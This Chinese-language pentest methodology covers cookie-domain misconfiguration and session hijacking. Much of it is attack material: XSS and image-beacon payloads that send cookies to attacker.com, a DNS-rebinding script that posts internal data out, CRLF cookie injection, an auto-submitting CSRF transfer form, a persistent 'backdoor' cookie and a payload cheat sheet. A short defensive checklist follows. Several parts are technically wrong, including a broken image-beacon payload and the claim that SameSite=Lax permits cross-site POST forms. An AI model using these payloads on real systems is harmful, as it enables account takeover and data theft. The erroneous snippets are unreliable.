# Cookie 域配置与会话劫持攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 Cookie 域配置漏洞检测与会话劫持攻击测试与利用流程。通过本方法论，测试人员能够系统性地检测和利用因 Cookie 域配置不当、DNS 映射错误、信任边界失效导致的会话劫持漏洞，包括子域 Cookie 泄露、DNS 重绑定攻击、Cookie 注入等技术。

## 1.2 适用范围

本文档适用于以下场景：
- 使用 Cookie 进行会话管理的 Web 应用
- 多子域架构的企业应用
- 使用第三方服务支持的企业网站
- 存在 DNS 映射配置错误的系统
- 使用泛域名证书的网站
- 微服务架构中的会话共享系统

## 1.3 读者对象

本文档主要面向：
- 执行渗透测试任务的安全工程师
- 进行 Web 安全评估的顾问
- 负责会话安全管理的技术人员
- 安全研究人员

---

# 第二部分：核心渗透技术专题

## 专题一：Cookie 域配置与会话劫持攻击

### 2.1 技术介绍

Cookie 域配置漏洞是指由于 Cookie 的 Domain 属性配置不当，导致 Cookie 被发送到不可信的域，从而使攻击者能够窃取用户会话或进行其他攻击。

**漏洞原理：**
- **子域 Cookie 泄露：** Cookie 的 Domain 设置为父域（如 `.example.com`），所有子域都能访问
- **DNS 映射错误：** 第三方子域（如 `support.provider.com`）DNS 指向攻击者控制的服务器
- **信任边界失效：** 应用信任来自特定域的请求，但该域可被攻击者控制
- **Cookie 注入：** 攻击者能够设置或修改目标域的 Cookie

**CWE 映射：**
| CWE 编号 | 描述 |
|---------|------|
| CWE-565 | 依赖未经验证和完整性检查的 Cookie |
| CWE-784 | 在安全决策中依赖未经验证和完整性检查的 Cookie |
| CWE-829 | 来自不可信控制域的功能包含 |
| CWE-830 | 来自不可信来源的 Web 功能包含 |

**本质：** 应用未能正确维护信任边界，将来自不可信域的请求或数据当作可信处理。

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **企业网站** | 使用第三方客服、分析服务 | 子域映射给第三方，Cookie 被窃取 |
| **SaaS 应用** | 多租户子域架构 | 子域 Cookie 配置不当导致跨租户访问 |
| **电商平台** | 使用外部支付、物流服务 | 支付子域可访问主域 Cookie |
| **社交媒体** | 第三方应用集成 | OAuth 回调域配置不当 |
| **金融机构** | 网上银行多子系统 | 子域信任关系被滥用 |
| **政府网站** | 多部门子站点 | 泛域名证书 + 宽泛 Cookie 域 |
| **云服务平台** | 客户自定义子域 | 子域接管导致 Cookie 泄露 |
| **API 网关** | 多后端服务共享 Cookie | Cookie 域配置过宽 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**Cookie 配置分析：**

1. **检查 Cookie Domain 属性**
   ```bash
   # 使用浏览器开发者工具或 Burp Suite
   # 检查 Set-Cookie 响应头

   Set-Cookie: session=abc123; Domain=.example.com; Path=/; Secure; HttpOnly
   # Domain=.example.com 表示所有子域都能访问此 Cookie

   # 测试不同子域是否能访问 Cookie
   curl -H "Host: www.example.com" https://example.com
   curl -H "Host: api.example.com" https://example.com
   curl -H "Host: support.example.com" https://example.com
   ```

2. **识别第三方子域映射**
   ```bash
   # 枚举子域
   subfinder -d example.com
   assetfinder --subs-only example.com
   amass enum -d example.com

   # 检查子域 DNS 记录
   dig support.example.com
   dig cdn.example.com
   dig api.example.com

   # 检查 CNAME 记录
   dig CNAME support.example.com
   # 如果指向第三方服务（如 zendesk.com、intercom.io）
   # 可能存在 Cookie 泄露风险
   ```

3. **测试 Cookie 作用域**
   ```bash
   # 在主域设置 Cookie
   curl -H "Host: example.com" \
     -H "Set-Cookie: test=value; Domain=.example.com" \
     https://example.com

   # 尝试在子域访问
   curl -H "Host: sub.example.com" \
     -H "Cookie: test=value" \
     https://sub.example.com

   # 检查子域是否能读取/使用 Cookie
   ```

4. **检测 DNS 重绑定漏洞**
   ```bash
   # 检查是否有子域使用短 TTL
   dig +ttl example.com

   # 如果 TTL 很短（如 60 秒），可能存在 DNS 重绑定风险
   # 攻击者可以快速切换 DNS 记录
   ```

#### 2.3.2 白盒测试

**代码审计要点：**

1. **检查 Cookie 配置代码**
   ```javascript
   // 危险模式：Domain 设置过宽
   res.cookie('session', sessionId, {
     domain: '.example.com',  // 所有子域可访问
     path: '/'
   });

   // 安全模式：限制到特定子域
   res.cookie('session', sessionId, {
     domain: 'www.example.com',  // 仅主站可访问
     path: '/'
   });
   ```

2. **检查信任边界配置**
   ```python
   # 危险模式：信任所有子域
   def is_trusted_origin(origin):
       return origin.endswith('example.com')  # 包括 attacker.example.com

   # 安全模式：白名单验证
   def is_trusted_origin(origin):
       trusted_origins = [
           'www.example.com',
           'api.example.com',
           'admin.example.com'
       ]
       return origin in trusted_origins
   ```

3. **检查 CORS 配置**
   ```javascript
   // 危险模式：宽松的 CORS 配置
   app.use(cors({
     origin: /.+\.example\.com$/,  // 正则匹配所有子域
     credentials: true
   }));

   // 安全模式：严格白名单
   app.use(cors({
     origin: ['https://www.example.com', 'https://api.example.com'],
     credentials: true
   }));
   ```

### 2.4 漏洞利用方法

#### 2.4.1 子域 Cookie 窃取攻击

**场景：第三方支持子域**

```
目标架构：
- 主站：www.example.com
- 支持子域：support.example.com → 指向 zendesk.com
- Cookie Domain: .example.com
```

**攻击步骤：**

**步骤 1：确认子域映射**
```bash
# 检查 support.example.com 的 DNS 记录
dig CNAME support.example.com
# 返回：support.example.com. CNAME example.zendesk.com

# 验证 Cookie 可访问性
curl -H "Host: support.example.com" \
     -H "Cookie: session=victim_session" \
     https://support.example.com
# 如果响应包含用户信息，说明 Cookie 可被支持子域访问
```

**步骤 2：在支持子域植入 XSS**
```bash
# 如果支持子域存在 XSS 漏洞
# 或者支持平台允许自定义脚本（如某些客服系统）

# Payload：窃取 Cookie 并发送到攻击者服务器
<script>
  fetch('https://attacker.com/exfil?c=' + document.cookie);
</script>

# 或者使用图片信标
<img src="https://attacker.com/exfil?c=" + document.cookie>
```

**步骤 3：会话劫持**
```bash
# 获取受害者 Cookie 后
curl -H "Cookie: session=stolen_session_value" \
     https://www.example.com/account

# 现在可以以受害者身份访问主站
```

#### 2.4.2 DNS 重绑定攻击

**攻击原理：** 利用短 TTL 的 DNS 记录，在浏览器解析后快速切换 IP，绕过同源策略。

**攻击步骤：**

**步骤 1：设置恶意 DNS**
```bash
# 攻击者控制 evil.com
# 第一次解析：指向目标内网 IP
# 第二次解析：指向攻击者服务器

# 使用工具如 rbndr 或 singularity
```

**步骤 2：诱导用户访问**
```html
<!-- 攻击者页面 -->
<script>
  // 第一次请求：解析为目标内网 IP
  fetch('http://evil.com:8080/admin')
    .then(r => r.text())
    .then(data => {
      // 发送数据到攻击者服务器
      fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: data
      });
    });

  // 快速切换 DNS（依赖短 TTL）
  // 后续请求将指向攻击者服务器
</script>
```

**步骤 3：窃取内网资源**
```bash
# DNS 重绑定可用于访问内网资源
# 如内部管理系统、未授权 API 等
```

#### 2.4.3 Cookie 注入攻击

**场景：攻击者能够设置目标域的 Cookie**

**方法 1：通过子域设置 Cookie**
```bash
# 如果攻击者控制 sub.example.com
# 可以设置 Domain=.example.com 的 Cookie

# 在 sub.example.com 上执行
Set-Cookie: session=attacker_value; Domain=.example.com; Path=/

# 现在 www.example.com 也会收到这个 Cookie
```

**方法 2：通过 CRLF 注入设置 Cookie**
```bash
# 如果存在 HTTP 响应拆分漏洞
GET /page?redirect=%0D%0ASet-Cookie:%20session=attacker%0D%0A

# 响应可能包含
HTTP/1.1 200 OK
Set-Cookie: session=attacker
...
```

**方法 3：利用跨站脚本设置 Cookie**
```javascript
// 如果存在 XSS 漏洞
document.cookie = "session=attacker_value; domain=.example.com; path=/";

// 注意：这通常受 SameSite 和 Secure 标志限制
```

#### 2.4.4 信任边界绕过攻击

**场景：应用信任特定域名的请求**

**方法 1：Origin/Referer 欺骗**
```bash
# 如果应用验证 Origin 头
curl -X POST https://target.com/api/action \
  -H "Origin: https://trusted.example.com" \
  -H "Referer: https://trusted.example.com/page" \
  -d '{"action": "transfer", "amount": 10000}'
```

**方法 2：子域信任滥用**
```bash
# 如果应用信任所有 example.com 子域
# 攻击者可以：
# 1. 注册相似子域（如 example-com.evil.com）
# 2. 利用 DNS 配置错误
# 3. 进行子域接管

# 然后发送"可信"请求
curl -X POST https://target.com/api/action \
  -H "Origin: https://compromised.example.com"
```

#### 2.4.5 会话固定攻击

**攻击步骤：**

```bash
# 步骤 1：获取有效会话 ID
curl -c cookies.txt https://target.com/login

# 步骤 2：诱导用户使用该会话
# 通过 XSS、Cookie 注入等方式设置受害者浏览器的会话

# 步骤 3：用户使用被固定的会话登录
# 攻击者可以使用相同会话 ID 访问用户账户

# 步骤 4：验证会话
curl -b cookies.txt https://target.com/account
```

#### 2.4.6 信息收集命令

```bash
# Cookie 信息收集
curl -I https://target.com
curl -I https://sub.target.com

# 检查 Cookie 属性
curl -c - https://target.com

# 子域枚举
subfinder -d target.com -o subs.txt
assetfinder --subs-only target.com >> subs.txt

# DNS 记录检查
for sub in $(cat subs.txt); do
  echo "=== $sub ==="
  dig A $sub +short
  dig CNAME $sub +short
done

# 检查 CORS 配置
for sub in $(cat subs.txt); do
  curl -I -H "Origin: https://attacker.com" \
    https://$sub 2>/dev/null | grep -i "access-control"
done
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过 SameSite 保护

**方法 1：利用子域请求**
```bash
# SameSite=Lax 允许顶级导航
# SameSite=Strict 阻止所有跨站请求

# 但如果是子域请求，可能绕过
# 从 sub1.example.com 请求 sub2.example.com
# 可能被视为"站内"请求
```

**方法 2：利用表单提交**
```html
<!-- SameSite=Lax 允许跨站 POST 表单 -->
<form action="https://target.com/api/action" method="POST">
  <input type="hidden" name="action" value="transfer">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

#### 2.5.2 绕过 Secure 标志

**方法 1：SSL 剥离**
```bash
# 使用 sslstrip 等工具
# 将 HTTPS 连接降级为 HTTP

# 前提：目标未启用 HSTS
```

**方法 2：子域 HTTP 访问**
```bash
# 如果子域同时支持 HTTP 和 HTTPS
# Cookie 可能被发送到 HTTP 子域

# 检查子域 HTTP 访问
curl http://sub.target.com
```

#### 2.5.3 绕过 HttpOnly 保护

**方法 1：利用其他漏洞**
```bash
# HttpOnly 阻止 JavaScript 访问 Cookie
# 但可以通过其他方式窃取：

# 1. XSS + 表单提交
<script>
  document.forms[0].action = 'https://attacker.com/exfil';
  document.forms[0].submit();
</script>

# 2. CSRF + 状态改变攻击
```

**方法 2：利用其他端点**
```bash
# 如果其他端点未设置 HttpOnly
# 可以通过该端点窃取 Cookie
```

#### 2.5.4 持久化技术

**方法 1：DNS 持久化**
```bash
# 如果成功影响 DNS 配置
# 可以长期控制子域解析

# 或者注册过期子域
```

**方法 2：Cookie 持久化**
```bash
# 设置长过期时间的 Cookie
Set-Cookie: backdoor=value; Domain=.example.com; Max-Age=31536000

# 即使原始漏洞修复，Cookie 仍然有效
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | 目标 | Payload 示例 | 说明 |
|-----|------|------------|------|
| **Cookie 窃取** | XSS | `<script>fetch('https://attacker.com/?c='+document.cookie)</script>` | 窃取 Cookie |
| **Cookie 窃取** | 图片信标 | `<img src="https://attacker.com/?c="+document.cookie>` | 隐蔽窃取 |
| **Cookie 注入** | CRLF | `%0D%0ASet-Cookie:%20session=attacker%0D%0A` | 响应拆分 |
| **DNS 重绑定** | 内网访问 | 使用 rbndr 工具 | 绕过同源策略 |
| **Origin 欺骗** | API 调用 | `-H "Origin: https://trusted.example.com"` | 绕过 CORS |
| **会话固定** | 会话劫持 | 预先设置会话 Cookie | 固定用户会话 |

## 3.2 Cookie 安全属性说明

| 属性 | 作用 | 绕过难度 |
|-----|------|---------|
| **Secure** | 仅通过 HTTPS 发送 | 中（SSL 剥离） |
| **HttpOnly** | 阻止 JavaScript 访问 | 高（需其他漏洞） |
| **SameSite=Lax** | 阻止跨站请求（除导航） | 中（表单提交） |
| **SameSite=Strict** | 阻止所有跨站请求 | 高 |
| **SameSite=None** | 允许跨站请求 | 低（需 Secure） |
| **Domain** | 指定 Cookie 作用域 | 取决于配置 |
| **Path** | 指定 Cookie 路径 | 低 |

## 3.3 Cookie 域配置安全检查清单

- [ ] Cookie Domain 设置为最具体的域
- [ ] 启用 Secure 标志
- [ ] 启用 HttpOnly 标志
- [ ] 设置合适的 SameSite 属性
- [ ] 子域 DNS 配置正确
- [ ] 第三方子域有适当隔离
- [ ] CORS 配置严格
- [ ] 信任边界明确定义
- [ ] 会话有合理的过期时间
- [ ] 登录后重新生成会话 ID

## 3.4 常见子域接管检查列表

| 服务提供商 | 检查方法 | 接管条件 |
|-----------|---------|---------|
| **Zendesk** | `dig CNAME support.example.com` | CNAME 指向 zendesk.com 但未配置 |
| **Intercom** | `dig CNAME help.example.com` | CNAME 指向 intercom.io 但未配置 |
| **GitHub Pages** | `dig CNAME docs.example.com` | CNAME 指向 github.io 但未配置 |
| **AWS S3** | `dig CNAME static.example.com` | CNAME 指向 s3.amazonaws.com 但 bucket 不存在 |
| **Azure CDN** | `dig CNAME cdn.example.com` | CNAME 指向 azureedge.net 但未配置 |
| **Shopify** | `dig CNAME shop.example.com` | CNAME 指向 shops.myshopify.com 但未配置 |
| **Heroku** | `dig CNAME app.example.com` | CNAME 指向 herokuapp.com 但未配置 |

## 3.5 防御建议

1. **最小化 Cookie 作用域**：将 Cookie Domain 设置为最具体的域
2. **启用安全标志**：设置 Secure、HttpOnly、SameSite 标志
3. **子域隔离**：敏感操作使用独立子域，不共享 Cookie
4. **DNS 审计**：定期检查子域 DNS 配置，清理未使用子域
5. **第三方管理**：严格管理第三方子域映射，实施最小权限
6. **CORS 限制**：配置严格的 CORS 策略
7. **信任边界**：明确定义和维护信任边界
8. **会话管理**：实施安全的会话管理机制
9. **HSTS**：启用 HTTP Strict Transport Security
10. **监控告警**：监控异常的 Cookie 使用和子域访问

---

**参考资源：**
- [OWASP Cookie Security](https://owasp.org/www-community/controls/SecureCookieAttribute)
- [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [PortSwigger - HTTP Cookies](https://portswigger.net/web-security/cookies)
- [CWE-565](https://cwe.mitre.org/data/definitions/565.html)
- [CWE-784](https://cwe.mitre.org/data/definitions/784.html)
